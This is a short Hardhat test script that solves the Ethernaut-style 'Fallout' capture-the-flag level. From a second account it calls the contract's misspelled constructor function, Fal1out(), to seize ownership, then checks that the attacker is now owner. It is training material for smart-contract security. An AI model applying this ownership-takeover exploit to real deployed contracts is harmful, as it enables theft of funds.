const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");

describe("Fallout", function () {
  it("Claim ownership", async function () {
    const [_, eoa] = await ethers.getSigners()
    const Contract = await ethers.getContractFactory("Fallout")
    const contract = await Contract.deploy()
    await contract.deployed()

    // Call faulty constructor function
    await contract.connect(eoa).Fal1out()

    // Check that we are now owner
    expect(await contract.owner()).to.equal(eoa.address)
    
  });
});
